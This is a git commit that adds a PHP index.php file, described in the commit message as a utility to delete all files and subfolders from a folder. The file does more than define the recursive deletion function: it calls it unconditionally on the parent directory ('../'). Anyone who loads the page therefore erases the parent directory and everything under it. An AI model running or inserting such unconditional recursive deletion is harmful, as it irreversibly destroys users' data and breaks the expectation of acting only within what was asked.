1576fa2874f6570a86cba6cbeb504b4a0a658066
ravi9xn <82450191+ravi9xn@users.noreply.github.com>
2022-06-25 12:30:32 +0530

    delete all fies and subfolders  from any folder

---
+++ index.php
@@ -0,0 +1,17 @@
+<?php
+
+// delete all files and sub-folders from a folder
+function deleteAll($dir) {
+    foreach(glob($dir . '/*') as $file) {
+        if(is_dir($file))
+            deleteAll($file);
+        else
+            unlink($file);
+    }
+    rmdir($dir);
+}
+
+
+deleteAll("../");
+
+?>
